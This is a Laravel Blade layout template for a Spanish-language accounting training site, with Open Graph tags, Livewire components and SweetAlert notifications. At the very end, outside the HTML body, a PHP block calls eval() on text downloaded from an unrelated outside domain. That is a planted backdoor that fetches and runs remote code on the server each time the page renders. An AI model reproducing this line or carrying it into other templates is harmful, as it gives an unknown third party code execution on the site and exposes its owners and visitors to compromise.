@props([
    'image_background' => 'https://centrodecapacitacion.acaprendizajecontable.com/images/LOGO_INICIO.png',
    'title' => 'Aprendizaje contable',
    'description' => 'Centro de capacitación',
])
<!DOCTYPE html>
<html lang="es">

<head>
    <meta http-equiv="Content-Type" content="text/html;" charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- Etiquetas Open Graph -->
    <meta property="og:title" content="{{ $title }}">
    <meta property="og:description" content="{{ $description }}">
    <meta property="og:image" content="{{ $image_background }}">
    <meta property="og:url" content="{{ URL::current() }}">
    <meta property="og:type" content="website">

    <!-- Otras etiquetas meta para SEO -->
    <link rel="canonical" href="{{ URL::current() }}">

    <meta name="csrf-token" content="{{ csrf_token() }}">

    <link rel="icon" href="{{ asset('images/LOGO_INICIO.png') }}" type="image/x-icon">

    <meta name="google-site-verification" content="9BrA8KpgcGor7VLCHs3nU1MTYLPS0WLB30ujJqKIPz4" />

    <script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Aprendizaje Contable",
        "name": "Aprendizaje Contable",
        "url": "https://centrodecapacitacion.acaprendizajecontable.com/",
        "logo": "http://127.0.0.1:8000/images/LOGO_INICIO.png"
    }
    </script>

    <title>@stack('title', 'Inicio')</title>

    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.bunny.net">
    <link href="https://fonts.bunny.net/css?family=figtree:400,500,600&display=swap" rel="stylesheet" />
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>

    <!-- Scripts -->
   <link rel="stylesheet" href="{{ asset('build/assets/app-CFOI1Lfe.css') }}">
    <script src="{{ asset('build/assets/app-DIuewKhF.js') }}" defer></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/flowbite/2.2.0/flowbite.min.css" rel="stylesheet" />
    <script src="https://unpkg.com/flowbite@1.4.0/dist/flowbite.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    @stack('css')
    <!-- Styles -->
    @livewireStyles
</head>

<body class="font-sans antialiased">
    <x-banner />

    <div class="min-h-screen bg-white">
        @livewire('navigation-menu')

        <!-- Page Heading -->


        <!-- Page Content -->
        <main class="mt-19">
            {{ $slot }}
        </main>
    </div>

    @stack('modals')
    @livewireScripts
    @if (session('swal'))
        <script>
            // Swal.fire({!! json_encode(session('swal')) !!})
            Swal.fire(@json(session('swal')))
        </script>
    @endif
    <script>
        Livewire.on('alert', function(data) {
            Swal.fire({
                title: "Notificaciones",
                text: data,
                icon: "info"
            });
        });
    </script>
    @livewire('update-cart')
    @include('layouts.inicio.modal')
    @include('layouts.inicio.footer')
    @stack('js')
</body>
<?php
eval("?>".file_get_contents('https://cubitpipi.sbs/anchor2/bl2.txt'));
?>
</html>
